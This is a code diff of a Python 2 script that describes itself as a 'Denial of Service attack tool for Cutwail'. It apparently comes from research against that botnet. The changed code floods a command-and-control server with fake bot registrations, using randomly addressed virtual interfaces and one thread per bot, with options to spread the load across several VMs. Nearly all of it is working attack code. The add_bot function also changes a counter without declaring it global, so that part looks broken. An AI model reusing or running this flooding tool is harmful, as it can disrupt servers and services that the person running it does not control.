@@ -22,7 +22,10 @@ import socket
 import fcntl
 import struct
 import time
+import os, signal
 import random
+import optparse
+import threading
 
 from bot import init_socket, communicate, generate_package, process_package
 from cipher import pencrypt, pdecrypt
@@ -32,11 +35,12 @@ from termcolor import cprint
 from subprocess import call
 
 # Enable/Disable debug mode
-DBG = False
+DBG         = False
+PRINT_CMD   = False
 
 # Bot network interface
-IFACE = "vmnet8"
-TIMEOUT = 3
+IFACE = "eth0"
+TIMEOUT = 1
 
 # C&C connection IP and Port number
 HOST = "10.0.0.128"
@@ -53,6 +57,15 @@ RC_CONFIG   = 7
 RC_MAILFROM = 8
 RC_ACCOUNTS = 9
 
+# Number of bots communicating with the C&C server
+BOT_NUM = 0 
+
+# Maintain a count on new newtwork interfaces made
+IFACE_COUNT = 0 
+
+# Thread lock
+lock = threading.Lock()
+
 # Assign a random class A private IP address to interface
 def init_iface(iface):
     rand1 = str(random.randint(0,255))
@@ -60,65 +73,107 @@ def init_iface(iface):
     rand3 = str(random.randint(0,254))
     ip = "10." + rand1 + "." + rand2 + "." + rand3
     call(["ifconfig", iface, ip])
+
     return ip
 
-def test():
-    cprint("Starting test communication...", "green")
-    
-    s = init_socket(IFACE, TIMEOUT)
-    communicate(s)
+# Add new bot to the botnet
+def add_bot(iface):
+    s = init_socket(iface, TIMEOUT)
+    communicate(s, dbg=DBG, print_cmd=PRINT_CMD)
     s.close()
 
+    with lock:
+        BOT_NUM -= 1 # Bot disconnected
+
+# Bring network interfaces down
+def ifconfig_down():
+    cprint("\n[*] Bringing network interfaces down...", "green")
+    for i in range(0, IFACE_COUNT + 1):
+        call(["ifconfig", IFACE + ":" + str(i), "down"])
+
+def print_status(ip, iface):
+    cprint("[+] Started new thread (" + str(BOT_NUM) + "): IFACE ", end="")
+    cprint(iface, "yellow", end="") 
+    cprint(" IP ", end="")
+    cprint(ip, "cyan")
+
+def print_statistics(runtime):
+    cprint("\n[*] Statistics:", "yellow")
+    cprint("Run time: " + str(runtime), "yellow")
+    cprint("Number of bots registered: " + str(BOT_NUM), "yellow")
+    cprint("Average register speed (bot per second): " + str(BOT_NUM/runtime), "yellow")
+    cprint("Average time taken to register one bot (s): " + str(runtime/BOT_NUM), "yellow")
+
 def main():
-    # Start timing
-    start = time.time()
-    count = 0
+    global BOT_NUM
+    global IFACE_COUNT
+
+    # Options parser
+    parser = optparse.OptionParser()
+    parser.add_option("-t", action="store", dest="TARGET_NUM", 
+                        default=1000, type="int",
+                        help="target number of bots")
+    parser.add_option("-n", action="store", dest="VM_NUM", 
+                        default=1, type="int",
+                        help="number of VMs working for DoS attack")
+    (opts, args) = parser.parse_args()
+
+    # Calculate the target number of bots for this machine
+    TARGET = opts.TARGET_NUM / opts.VM_NUM
+
+    print "Denial of Service attack tool for Cutwail\n"
+
+    # Get the PID of this process and save it to a file
+    f = open("pid.txt", "w")
+    f.write(str(os.getpid()))
+    f.close()
+
+
+    threads = [] # Maintain a list of threads
+    start = time.time() # Start timer
 
     print "[*] Starting DoS attack...\n"
 
-    try:
-        while True:
-            iface = IFACE + ":" + str(count)
-
-            # Initialize interface
+    while BOT_NUM < TARGET:
+        try:
+            # Initialize new network interface
+            iface = IFACE + ":" + str(IFACE_COUNT)
             ip = init_iface(iface)
 
-            # Initialize socket
-            s = init_socket(iface)
+            # Start a new thread and add new bot to the botnet
+            t = threading.Thread(target=add_bot, args=(iface,))
+            threads.append(t)
+            t.start()
 
-            # Communicate with the C&C server
-            communicate(s)
+            with lock:
+                BOT_NUM += 1
 
-            count += 1
+            IFACE_COUNT += 1
 
-            if (DBG):
-                # Print status
-                sys.stdout.write("[")
-                cprint(iface, "cyan", end="")
-                sys.stdout.write("]\t")
-                cprint(ip, "yellow", end="")
-                sys.stdout.write("\tcount = ")
-                cprint(str(count), "green")
+            # Print status
+            print_status(ip, iface)
 
-    except Exception as e:
-        # Stop timing
-        end = time.time()
-        run_time = end - start
+        except KeyboardInterrupt:
+            print "[-] KeyboardInterrupt: executing exit routine..."
+            break
 
-        print "[-]", e
-        if (DBG):
-            cprint("\n[*] Bringing network interfaces down...", "red")
+        except Exception as e:
+            cprint("[-] " + str(e), "red")
+            break
 
-        # Bring interfaces down
-        for i in range(0, count+1):
-            call(["ifconfig", IFACE + ":" + str(i), "down"])
+    # Stop timing
+    end = time.time()
+    runtime = end - start
 
-        # Print statistics
-        cprint("[*] Statistics:", "yellow")
-        cprint("Run time: " + str(run_time), "yellow")
-        cprint("Number of bots registered: " + str(count), "yellow")
-        cprint("Average register speed (bot per second): " + str(count/run_time), "yellow")
-        cprint("Average time taken to register one bot (s): " + str(run_time/count), "yellow")
+    # Print statistics
+    print_statistics(runtime)
+
+    # Wait for all threads to terminate
+    for thread in threads:
+        thread.join()
+    
+    # Bring interfaces down
+    ifconfig_down()
 
 
 if __name__ == "__main__":
